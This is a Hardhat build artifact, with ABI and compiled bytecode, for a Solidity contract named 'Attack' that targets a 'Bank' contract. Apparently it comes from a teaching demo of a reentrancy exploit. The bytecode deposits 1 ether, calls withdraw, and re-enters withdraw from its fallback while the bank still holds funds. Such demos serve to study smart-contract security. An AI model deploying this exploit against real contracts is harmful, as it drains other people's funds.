{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/Attack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_depositFundsAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "depositFunds",
      "outputs": [
        {
          "internalType": "contract Bank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104c93803806104c9833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6103b2806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe0146101025780639e5faafc1461012d578063e2c41dbc1461013757610039565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101005760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b505050505b005b34801561010e57600080fd5b50610117610162565b60405161012491906102c7565b60405180910390f35b61013561016a565b005b34801561014357600080fd5b5061014c61028a565b6040516101599190610361565b60405180910390f35b600047905090565b670de0b6b3a764000034101561017f57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101ef57600080fd5b505af1158015610203573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561027057600080fd5b505af1158015610284573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b6102c1816102ae565b82525050565b60006020820190506102dc60008301846102b8565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061032761032261031d846102e2565b610302565b6102e2565b9050919050565b60006103398261030c565b9050919050565b600061034b8261032e565b9050919050565b61035b81610340565b82525050565b60006020820190506103766000830184610352565b9291505056fea26469706673582212208b22ce6afdd5cdcfb72667b0d35425a239374085b44f11b3fe12f5dbc461eac864736f6c63430008090033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}